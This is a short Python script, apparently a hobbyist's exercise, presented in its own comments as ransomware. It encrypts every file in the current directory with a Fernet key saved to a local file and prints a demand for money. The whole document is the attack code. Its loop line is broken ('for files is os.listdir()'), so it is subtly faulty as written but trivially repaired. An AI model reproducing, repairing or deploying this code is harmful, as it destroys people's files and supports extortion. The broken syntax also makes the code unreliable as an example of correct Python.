#!/usr/bin/python3

# Do not exeute this script
# this is a legit malware and can destroy your pc. 

#here we go


import os
from cryptography.fernet import Fernet
#let's find some files

files = []

#goes through every single file in  a directory
for files is os.listdir():
	if file == "ransomware.py" or file == "decrypt.py" or file == "thekey.key":
		continue
#checks if something is  file. IF file add to the list
	if os.path.isfile(file):
		files.append(file)

#Fernet is a way of encryption which allows the use of key to unlock
#Creatiing a random key using fernet. Need to save this or else how to unlock?
key =  Fernet.generate_key()
#using open function to open the thekey file as thekey function
with open("thekey.key", "wb") as thekey:
	thekey.write(key)
for file in files:
	with open(file, "rb") as thefile:
		contents = thefile.read()
	contents_encrypted = Fernet(key).encrypt(contents)
	with open(file, "wb") as thefile:
		thefile.write(contents_encrypted)
#now begins the fun 
# THis is it. Ransomeware created

print("All files encrypted. Send me money for getting decryption")


